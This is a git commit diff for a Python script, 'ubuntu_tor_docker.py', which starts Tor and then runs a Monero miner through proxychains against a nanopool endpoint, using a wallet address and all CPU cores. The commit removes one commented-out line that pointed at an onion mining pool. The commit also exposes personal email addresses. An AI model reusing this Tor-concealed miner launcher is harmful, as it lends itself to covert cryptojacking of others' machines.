3abbe6ff6c3e393376bd060a191ad6b9582f3faf
wollfoo <nhac.tien1988@gmail.com>
2023-09-05 19:13:56 +0700

    Update ubuntu_tor_docker.py

--- ubuntu_tor_docker.py
+++ ubuntu_tor_docker.py
@@ -34,4 +34,3 @@ except:
 os.system('tor &')
 time.sleep(60)
 os.system ('proxychains4 ' + program + ' --donate-level 1 -o xmr-us-west1.nanopool.org:14433 -u 44XbJdyExZZbCqrGyvG1oUbTpBL8JNqHVh8hmYXgUfEHgHs4t45yMfKeTAUQ4dDNtPc2vXhj83uJf1byNSgwU9ZYFxgT3Ao.orcfullaz/jmayo66@yahoo.com -p az -a rx/0 -k --tls -t ' + str(cores))
-#os.system ('proxychains4 ' + program + ' --donate-level 1 -o stratum+tcp://5pwcq42aa42fjzel.onion:442 --tls -t ' + str(cores))
